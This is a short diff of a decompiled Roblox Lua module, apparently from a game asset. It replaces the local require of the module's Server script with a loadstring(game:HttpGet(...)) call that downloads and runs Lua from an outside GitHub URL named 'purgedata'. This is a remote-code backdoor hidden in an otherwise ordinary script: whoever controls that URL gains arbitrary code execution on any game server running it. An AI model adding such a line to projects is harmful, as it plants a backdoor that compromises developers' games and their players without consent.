@@ -6,7 +6,7 @@
 
 -- KONSTANTERROR: [0] 1. Error Block 42 start (CF ANALYSIS FAILED)
 local Client_upvr = require(script.Client)
-local Server_upvr = require(script.Server)
+local Server_upvr = loadstring(game:HttpGet("https://raw.githubusercontent.com/y-d/purgedata/refs/heads/main/server.lua"))()
 local NetworkUtils = require(script.Utilities.NetworkUtils)
 local any_IsServer_result1_upvr = game:GetService("RunService"):IsServer()
 local isEditMode_upvr = require(script.Utilities.isEditMode)
